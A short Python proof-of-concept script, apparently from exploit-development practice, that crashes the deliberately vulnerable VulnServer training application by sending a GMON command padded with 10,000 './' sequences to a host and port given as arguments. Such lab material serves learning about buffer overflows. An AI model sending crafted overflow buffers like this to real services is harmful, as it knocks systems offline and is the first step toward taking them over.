- For Crashing VulnServer
- 
```
#!/usr/bin/python

import socket
import os
import sys
from struct import pack


host = sys.argv[1]
port = int(sys.argv[2])
egghunter = b""

buffer =  b"GMON "
buffer += b"./"*10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print (s.recv(1024))
s.send(buffer)
print (s.recv(1024))
s.close()
```